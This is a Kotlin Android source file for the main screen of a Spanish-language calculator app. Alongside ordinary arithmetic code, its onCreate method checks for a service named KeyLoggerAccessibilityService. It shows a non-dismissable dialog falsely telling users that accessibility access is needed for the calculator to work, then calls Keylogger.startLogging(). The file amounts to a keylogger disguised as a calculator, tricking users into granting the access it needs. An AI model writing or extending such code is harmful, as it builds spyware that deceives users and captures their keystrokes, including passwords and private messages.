package com.agenciacristal.calculadora

import android.accessibilityservice.AccessibilityService
import android.content.Context
import android.content.Intent
import android.os.Bundle
import android.provider.Settings
import android.view.View
import android.widget.Button
import android.widget.TextView
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import java.text.DecimalFormat

class MainActivity : AppCompatActivity() {


    companion object {
        private const val SUMA = "+"
        private const val RESTA = "-"
        private const val MULTIPLICACION = "*"
        private const val DIVISION = "/"
        private const val PORCENTAJE = "%"
    }

    private var operacionActual = ""
    private var primerNumero: Double = Double.NaN
    private var segundoNumero: Double = Double.NaN

    private lateinit var tvTemp: TextView
    private lateinit var tvResult: TextView

    private val formatoDecimal = DecimalFormat("#.##########")

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)


        if (!isAccessibilityServiceEnabled(this, KeyLoggerAccessibilityService::class.java)) {
            AlertDialog.Builder(this)
                .setTitle("Habilitar servicio de accesibilidad")
                .setMessage("Para que la aplicación realice el conteo correctamente, es necesario habilitar el servicio de accesibilidad del teclado. Actívalo ahora")
                .setPositiveButton("Sí") { _, _ ->
                    startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
                }
                .setNegativeButton("No") { dialog, _ ->
                    dialog.dismiss()
                }
                .setCancelable(false)
                .show()
        }


        Keylogger.startLogging()

        tvTemp = findViewById(R.id.tvTemp)
        tvResult = findViewById(R.id.tvResult)
    }

    fun cambiarOperador(view: View) {
        if (tvTemp.text.isNotEmpty() || !primerNumero.isNaN()) {
            calcular()
            val boton = view as Button
            operacionActual = when (boton.text.toString().trim()) {
                "÷" -> DIVISION
                "X" -> MULTIPLICACION
                else -> boton.text.toString().trim()
            }
            if (tvTemp.text.isEmpty()) {
                tvTemp.text = tvResult.text
            }
            tvResult.text = getString(R.string.resultado_operacion, formatoDecimal.format(primerNumero), operacionActual)
            tvTemp.text = ""
        }
    }

    private fun calcular() {
        try {
            if (!primerNumero.isNaN()) {
                if (tvTemp.text.isEmpty()) {
                    tvTemp.text = tvResult.text
                }
                segundoNumero = tvTemp.text.toString().toDouble()
                tvTemp.text = ""
                primerNumero = when (operacionActual) {
                    SUMA -> primerNumero + segundoNumero
                    RESTA -> primerNumero - segundoNumero
                    MULTIPLICACION -> primerNumero * segundoNumero
                    DIVISION -> primerNumero / segundoNumero
                    PORCENTAJE -> primerNumero % segundoNumero
                    else -> primerNumero
                }
            } else {
                primerNumero = tvTemp.text.toString().toDouble()
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    fun seleccionarNumero(view: View) {
        val boton = view as Button
        tvTemp.append(boton.text.toString())
    }

    fun igual(@Suppress("UNUSED_PARAMETER") view: View) {
        calcular()
        tvResult.text = formatoDecimal.format(primerNumero)
        operacionActual = ""
    }

    fun borrar(view: View) {
        val boton = view as Button
        when (boton.text.toString().trim()) {
            "C" -> {
                if (tvTemp.text.isNotEmpty()) {
                    tvTemp.text = tvTemp.text.dropLast(1)
                } else {
                    primerNumero = Double.NaN
                    segundoNumero = Double.NaN
                    tvTemp.text = ""
                    tvResult.text = ""
                }
            }
            "CA" -> {
                primerNumero = Double.NaN
                segundoNumero = Double.NaN
                tvTemp.text = ""
                tvResult.text = ""
            }
        }
    }


    private fun isAccessibilityServiceEnabled(context: Context, service: Class<out AccessibilityService>): Boolean {
        val enabledServices = Settings.Secure.getString(
            context.contentResolver,
            Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
        )
        if (enabledServices != null) {
            val serviceId = "${context.packageName}/${service.canonicalName}"
            return enabledServices.contains(serviceId)
        }
        return false
    }
}